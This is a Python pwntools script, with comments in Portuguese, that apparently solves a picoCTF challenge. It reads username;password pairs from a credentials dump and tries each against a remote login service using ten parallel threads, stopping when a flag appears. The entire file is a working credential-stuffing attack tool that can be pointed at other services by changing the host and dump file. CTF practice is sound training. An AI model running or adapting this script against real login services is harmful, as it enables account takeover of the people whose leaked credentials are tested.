#!/usr/bin/env python3
from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import re
import time

# Instância atual do desafio
HOST = "crystal-peak.picoctf.net"
PORT = 52170

# Dump fornecido pelo desafio
CREDS_FILE = "creds-dump.txt"

# Pela calibração anterior, 10 workers está estável:
# invalid=250 incomplete=0 error=0
WORKERS = 10

context.log_level = "error"

found_event = threading.Event()

def try_login(index, username, password):
    """
    Testa uma credencial contra o serviço.

    A lógica segue o writeup:
    1. conecta no serviço
    2. espera Username:
    3. envia usuário
    4. espera Password:
    5. envia senha
    6. lê a resposta
    7. procura picoCTF{
    """
    if found_event.is_set():
        return None

    try:
        io = remote(HOST, PORT, timeout=5)

        io.sendlineafter(b"Username:", username.encode("utf-8"), timeout=5)
        io.sendlineafter(b"Password:", password.encode("utf-8"), timeout=5)

        # Timeout um pouco maior que o writeup para não cortar a flag
        result = io.recvall(timeout=2)

        io.close()

        if b"picoCTF{" in result:
            found_event.set()

            text = result.decode("utf-8", errors="replace")

            return {
                "index": index,
                "username": username,
                "password": password,
                "response": text
            }

        return None

    except Exception:
        return None

def main():
    creds = []

    with open(CREDS_FILE, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()

            if not line or ";" not in line:
                continue

            # split(';', 1) evita erro caso a senha tenha ';'
            username, password = line.split(";", 1)
            creds.append((username, password))

    print(f"[*] Total de credenciais: {len(creds)}")
    print(f"[*] Host: {HOST}")
    print(f"[*] Porta: {PORT}")
    print(f"[*] Workers: {WORKERS}")
    print("[*] Procurando picoCTF{ na resposta pós-login...\n")

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = []

        for index, (username, password) in enumerate(creds, start=1):
            if found_event.is_set():
                break

            futures.append(
                executor.submit(
                    try_login,
                    index,
                    username,
                    password
                )
            )

            if index % 100 == 0:
                print(f"[*] Enfileiradas: {index}/{len(creds)}")

            # Pequeno espaçamento para não matar a instância
            time.sleep(0.01)

        for future in as_completed(futures):
            result = future.result()

            if result:
                print("\n[+] FLAG ENCONTRADA!")
                print(f"[+] Posição no dump: {result['index']}")
                print(f"[+] Username: {result['username']}")
                print(f"[+] Password: {result['password']}")

                print("\n========== RESPOSTA DO SERVIDOR ==========")
                print(result["response"])
                print("==========================================")

                match = re.search(r"picoCTF\{[^}]+\}", result["response"])
                if match:
                    print(f"\n[+] FLAG LIMPA: {match.group(0)}")

                with open("flag.txt", "w", encoding="utf-8") as out:
                    if match:
                        out.write(match.group(0) + "\n")
                    out.write("\n")
                    out.write(result["response"])

                return

    print("\n[-] Nenhuma flag encontrada.")

if __name__ == "__main__":
    main()
